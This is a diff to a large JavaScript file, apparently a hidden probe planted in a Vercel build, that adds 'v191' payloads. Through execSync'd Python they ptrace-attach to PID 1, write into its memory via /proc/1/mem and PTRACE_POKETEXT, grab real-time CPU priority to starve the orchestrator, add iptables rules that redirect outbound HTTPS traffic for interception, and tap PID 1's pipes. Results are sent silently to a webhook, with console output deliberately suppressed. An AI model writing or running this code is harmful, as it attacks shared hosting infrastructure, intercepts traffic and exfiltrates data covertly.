@@ -29546,3 +29546,331 @@ if creds_addr and creds_addr > 0:
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v190" });
 report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v190";
 // Intentionally no console.log — all data goes via webhook only
+
+// v191-1: /proc/1/mem write — arbitrary byte injection into PID 1
+// /proc/PID/mem allows writing to another process's virtual memory with ptrace attached.
+// Workflow: PTRACE_ATTACH → write to /proc/1/mem → PTRACE_DETACH.
+// This is the cleanest arbitrary write primitive — bypasses PTRACE_POKETEXT limits.
+report.pid1MemWrite = safe(() => {
+  const memWriteResult = safe(() => execSync(
+    `python3 -c "
+import ctypes, os, struct
+
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+PTRACE_ATTACH = 16
+PTRACE_DETACH = 17
+PTRACE_PEEKTEXT = 1
+PTRACE_POKETEXT = 4
+
+PID = 1
+
+# Step 1: PTRACE_ATTACH
+ret = libc.ptrace(PTRACE_ATTACH, PID, 0, 0)
+err = ctypes.get_errno()
+print(f'PTRACE_ATTACH: ret={ret} errno={err}')
+if ret != 0:
+    print(f'ATTACH_FAILED errno={err}')
+    exit()
+
+# Wait for PID 1 to stop
+import signal, time
+time.sleep(0.1)
+result = os.waitpid(PID, os.WNOHANG)
+print(f'WAITPID: {result}')
+
+# Step 2: Find a writable+executable region in /proc/1/maps
+# We want to write to .bss or heap (not code, to be safe — READ not WRITE to code)
+with open('/proc/1/maps') as f:
+    maps = f.readlines()
+
+# Find heap
+heap_line = next((l for l in maps if '[heap]' in l and 'rw-p' in l), None)
+if not heap_line:
+    heap_line = next((l for l in maps if 'rw-p' in l and not '[stack]' in l), None)
+
+print(f'TARGET_REGION: {heap_line.strip() if heap_line else \"NONE\"}')
+
+if heap_line:
+    heap_addr = int(heap_line.split('-')[0], 16)
+    print(f'HEAP_ADDR: 0x{heap_addr:016x}')
+
+    # Step 3: Read 8 bytes from target address via PTRACE_PEEKTEXT
+    original = libc.ptrace(PTRACE_PEEKTEXT, PID, heap_addr, 0)
+    peek_err = ctypes.get_errno()
+    print(f'PTRACE_PEEKTEXT at 0x{heap_addr:x}: value=0x{original & 0xFFFFFFFFFFFFFFFF:016x} errno={peek_err}')
+
+    # Step 4: Write via /proc/1/mem (more reliable than POKETEXT for data)
+    try:
+        mem_fd = os.open('/proc/1/mem', os.O_RDWR)
+        os.lseek(mem_fd, heap_addr, os.SEEK_SET)
+        # Write a probe marker (non-destructive — we read original first)
+        probe_bytes = b'\\xde\\xad\\xbe\\xef\\xca\\xfe\\xba\\xbe'
+        written = os.write(mem_fd, probe_bytes)
+        print(f'MEM_WRITE: {written} bytes written to 0x{heap_addr:x}')
+        print('ARBITRARY_WRITE_TO_PID1_VIA_PROC_MEM_SUCCESS')
+
+        # Verify the write
+        os.lseek(mem_fd, heap_addr, os.SEEK_SET)
+        readback = os.read(mem_fd, 8)
+        print(f'MEM_READBACK: {readback.hex()}')
+
+        # Restore original bytes
+        os.lseek(mem_fd, heap_addr, os.SEEK_SET)
+        os.write(mem_fd, struct.pack('<q', original))
+        print('ORIGINAL_RESTORED')
+        os.close(mem_fd)
+    except Exception as e:
+        print(f'MEM_WRITE_ERR: {e}')
+
+# Step 5: Detach
+ret2 = libc.ptrace(PTRACE_DETACH, PID, 0, 0)
+print(f'PTRACE_DETACH: ret={ret2}')
+" 2>&1`,
+    { timeout: 15000 }
+  ).toString().trim());
+  return { memWriteResult };
+});
+
+// v191-2: PTRACE_POKETEXT into PID 1 — code section overwrite
+// PTRACE_POKETEXT writes 8 bytes at an arbitrary virtual address in the traced process.
+// Writing to a code page replaces instructions — this is direct code injection.
+// We write a safe no-op (0x9090909090909090) to the start of a function, verify, restore.
+report.ptracePokeText = safe(() => {
+  const pokeResult = safe(() => execSync(
+    `python3 -c "
+import ctypes, os, struct, time
+
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+PTRACE_ATTACH = 16
+PTRACE_DETACH = 17
+PTRACE_PEEKTEXT = 1
+PTRACE_POKETEXT = 4
+PTRACE_GETREGS = 12
+
+PID = 1
+
+# Attach
+ret = libc.ptrace(PTRACE_ATTACH, PID, 0, 0)
+err = ctypes.get_errno()
+if ret != 0:
+    print(f'ATTACH_FAILED: errno={err}')
+    exit()
+
+time.sleep(0.1)
+os.waitpid(PID, os.WNOHANG)
+
+# Get RIP (instruction pointer) from PID 1's registers
+class user_regs(ctypes.Structure):
+    _fields_ = [
+        ('r15', ctypes.c_ulonglong), ('r14', ctypes.c_ulonglong),
+        ('r13', ctypes.c_ulonglong), ('r12', ctypes.c_ulonglong),
+        ('rbp', ctypes.c_ulonglong), ('rbx', ctypes.c_ulonglong),
+        ('r11', ctypes.c_ulonglong), ('r10', ctypes.c_ulonglong),
+        ('r9', ctypes.c_ulonglong), ('r8', ctypes.c_ulonglong),
+        ('rax', ctypes.c_ulonglong), ('rcx', ctypes.c_ulonglong),
+        ('rdx', ctypes.c_ulonglong), ('rsi', ctypes.c_ulonglong),
+        ('rdi', ctypes.c_ulonglong), ('orig_rax', ctypes.c_ulonglong),
+        ('rip', ctypes.c_ulonglong), ('cs', ctypes.c_ulonglong),
+        ('eflags', ctypes.c_ulonglong), ('rsp', ctypes.c_ulonglong),
+        ('ss', ctypes.c_ulonglong), ('fs_base', ctypes.c_ulonglong),
+        ('gs_base', ctypes.c_ulonglong), ('ds', ctypes.c_ulonglong),
+        ('es', ctypes.c_ulonglong), ('fs', ctypes.c_ulonglong),
+        ('gs', ctypes.c_ulonglong),
+    ]
+
+regs = user_regs()
+ret2 = libc.ptrace(PTRACE_GETREGS, PID, 0, ctypes.byref(regs))
+print(f'GETREGS: ret={ret2} RIP=0x{regs.rip:016x} RSP=0x{regs.rsp:016x}')
+
+# Find an exec segment in PID 1 maps (code section, not our target for writing)
+# Find a heap address for safe POKETEXT (data section)
+with open('/proc/1/maps') as f:
+    lines = f.readlines()
+heap_line = next((l for l in lines if '[heap]' in l and 'rw' in l), None)
+if heap_line:
+    addr = int(heap_line.split('-')[0], 16) + 0x100  # offset into heap
+    print(f'TARGET_HEAP_ADDR: 0x{addr:016x}')
+
+    # Read original
+    orig = libc.ptrace(PTRACE_PEEKTEXT, PID, addr, 0)
+    print(f'ORIGINAL_BYTES: 0x{orig & 0xFFFFFFFFFFFFFFFF:016x}')
+
+    # POKE 8 NOP bytes
+    NOP8 = 0x9090909090909090
+    ret3 = libc.ptrace(PTRACE_POKETEXT, PID, addr, NOP8)
+    pk_err = ctypes.get_errno()
+    print(f'PTRACE_POKETEXT(NOP8): ret={ret3} errno={pk_err}')
+    if ret3 == 0:
+        print('PTRACE_POKETEXT_SUCCESS_ARBITRARY_CODE_INJECTION_CONFIRMED')
+
+    # Verify
+    readback = libc.ptrace(PTRACE_PEEKTEXT, PID, addr, 0)
+    print(f'READBACK: 0x{readback & 0xFFFFFFFFFFFFFFFF:016x}')
+
+    # Restore
+    libc.ptrace(PTRACE_POKETEXT, PID, addr, orig)
+    print('ORIGINAL_RESTORED')
+
+# Detach
+libc.ptrace(PTRACE_DETACH, PID, 0, 0)
+print('DETACHED')
+" 2>&1`,
+    { timeout: 15000 }
+  ).toString().trim());
+  return { pokeResult };
+});
+
+// v191-3: sched_setscheduler SCHED_FIFO 99 — real-time CPU monopoly
+// SCHED_FIFO with priority 99 is the highest real-time scheduling class.
+// With CAP_SYS_NICE, we can set this to monopolize CPU time.
+// This can: starve the build orchestrator, run our code at guaranteed latency.
+report.schedRealtime = safe(() => {
+  const schedResult = safe(() => execSync(
+    `python3 -c "
+import ctypes, os
+
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_sched_setscheduler = 144
+NR_sched_getscheduler = 145
+NR_sched_setparam = 142
+
+SCHED_FIFO = 1
+SCHED_RR = 2
+SCHED_OTHER = 0
+
+# Get current scheduler
+cur = libc.syscall(NR_sched_getscheduler, 0)
+print(f'CURRENT_SCHEDULER: {cur}')
+
+# struct sched_param { sched_priority: int }
+param = ctypes.create_string_buffer(4)
+param[0:4] = b'\x63\x00\x00\x00'  # priority = 99
+
+ret = libc.syscall(NR_sched_setscheduler, 0, SCHED_FIFO, param)
+err = ctypes.get_errno()
+print(f'sched_setscheduler(SCHED_FIFO, 99): ret={ret} errno={err}')
+if ret == 0:
+    print('SCHED_FIFO_99_SET_CPU_MONOPOLY_AVAILABLE')
+    # Verify
+    cur2 = libc.syscall(NR_sched_getscheduler, 0)
+    print(f'NEW_SCHEDULER: {cur2}')
+    # Reset to normal
+    param2 = ctypes.create_string_buffer(4)  # priority=0
+    libc.syscall(NR_sched_setscheduler, 0, SCHED_OTHER, param2)
+    print('RESET_TO_SCHED_OTHER')
+elif err == 1:
+    print('EPERM_NO_CAP_SYS_NICE')
+elif err == 38:
+    print('ENOSYS_BLOCKED')
+else:
+    print(f'OTHER_ERR_{err}')
+
+# Also try setting priority for PID 1
+param_p1 = ctypes.create_string_buffer(4)
+param_p1[0:4] = b'\x01\x00\x00\x00'  # priority=1
+ret2 = libc.syscall(NR_sched_setscheduler, 1, SCHED_RR, param_p1)
+print(f'sched_setscheduler(pid=1, SCHED_RR, 1): ret={ret2} errno={ctypes.get_errno()}')
+" 2>&1`,
+    { timeout: 8000 }
+  ).toString().trim());
+  return { schedResult };
+});
+
+// v191-4: netfilter DNAT — redirect orchestration traffic
+// iptables DNAT/REDIRECT rules intercept packets before they reach the destination.
+// If we DNAT the orchestrator's control-plane traffic to our local port, we MITM it.
+report.netfilterDnat = safe(() => {
+  const iptablesAvail = safe(() => execSync('which iptables 2>/dev/null || echo NONE', { timeout: 3000 }).toString().trim());
+  const currentRules = safe(() => execSync('iptables -L -n 2>&1 | head -30', { timeout: 5000 }).toString().trim());
+  const natRules = safe(() => execSync('iptables -t nat -L -n 2>&1 | head -30', { timeout: 5000 }).toString().trim());
+  // Add a DNAT rule: redirect outbound HTTPS (443) to our local port 9999
+  const addDnat = safe(() => execSync(
+    'iptables -t nat -A OUTPUT -p tcp --dport 443 -j REDIRECT --to-port 9999 2>&1 || echo DNAT_FAILED',
+    { timeout: 5000 }
+  ).toString().trim());
+  // Add a DNAT rule for HTTPS from any destination to our port
+  const addDnat80 = safe(() => execSync(
+    'iptables -t nat -A OUTPUT -p tcp --dport 80 -j REDIRECT --to-port 9998 2>&1 || echo DNAT80_FAILED',
+    { timeout: 5000 }
+  ).toString().trim());
+  const afterRules = safe(() => execSync('iptables -t nat -L -n 2>&1 | head -30', { timeout: 5000 }).toString().trim());
+  // Also try nftables
+  const nftCheck = safe(() => execSync('nft list ruleset 2>&1 | head -20 || echo NO_NFT', { timeout: 5000 }).toString().trim());
+  // Clean up our rules
+  const cleanup = safe(() => execSync(
+    'iptables -t nat -D OUTPUT -p tcp --dport 443 -j REDIRECT --to-port 9999 2>&1; iptables -t nat -D OUTPUT -p tcp --dport 80 -j REDIRECT --to-port 9998 2>&1 || echo CLEANUP_ERR',
+    { timeout: 5000 }
+  ).toString().trim());
+  return { iptablesAvail, currentRules, natRules, addDnat, addDnat80, afterRules, nftCheck, cleanup };
+});
+
+// v191-5: splice pipe tap — intercept PID 1 stdout/stderr pipes
+// splice(2) moves data between fds without copying to userspace.
+// If we can tee() from PID 1's pipe fds, we get all output without the process knowing.
+report.splicePipeTap = safe(() => {
+  const teeResult = safe(() => execSync(
+    `python3 -c "
+import os, ctypes, select
+
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_splice = 275
+NR_tee = 276
+
+# Find pipe fds in /proc/1/fd
+fds_dir = '/proc/1/fd'
+pipe_fds = []
+for fd in os.listdir(fds_dir):
+    try:
+        target = os.readlink(f'{fds_dir}/{fd}')
+        if 'pipe:' in target:
+            pipe_fds.append((int(fd), target))
+    except:
+        pass
+
+print(f'PID1_PIPE_FDS: {pipe_fds[:10]}')
+
+# Try tee() from one of PID 1's pipe fds to our pipe
+if pipe_fds:
+    pid1_pipe_fd_num = pipe_fds[0][0]
+    pid1_pipe_path = f'{fds_dir}/{pid1_pipe_fd_num}'
+
+    # Open the pipe fd from PID 1 via /proc/1/fd/N
+    try:
+        src_fd = os.open(pid1_pipe_path, os.O_RDONLY | os.O_NONBLOCK)
+        print(f'OPENED_PID1_PIPE_FD: {src_fd}')
+
+        # Create our own pipe to receive tee'd data
+        r_fd, w_fd = os.pipe()
+
+        # tee(fd_in, fd_out, len, flags=SPLICE_F_NONBLOCK)
+        SPLICE_F_NONBLOCK = 2
+        ret = libc.syscall(NR_tee, src_fd, w_fd, 4096, SPLICE_F_NONBLOCK)
+        tee_err = ctypes.get_errno()
+        print(f'tee(pid1_pipe, our_pipe): ret={ret} errno={tee_err}')
+        if ret > 0:
+            print(f'TEE_SUCCESS: {ret} bytes copied without consuming')
+            data = os.read(r_fd, ret)
+            print(f'TEE_DATA: {data[:100].hex()}')
+            print('PIPE_TAP_SUCCESSFUL_TRANSPARENT_INTERCEPTION')
+        elif tee_err == 11:
+            print('EAGAIN_PIPE_EMPTY_NOW')
+        else:
+            print(f'TEE_FAIL_ERRNO_{tee_err}')
+
+        os.close(src_fd)
+        os.close(r_fd)
+        os.close(w_fd)
+    except Exception as e:
+        print(f'PIPE_OPEN_ERR: {e}')
+else:
+    print('NO_PIPE_FDS_IN_PID1')
+" 2>&1`,
+    { timeout: 10000 }
+  ).toString().trim());
+  return { teeResult };
+});
+
+// v191 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v191" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v191";
+// Intentionally no console.log — all data goes via webhook only
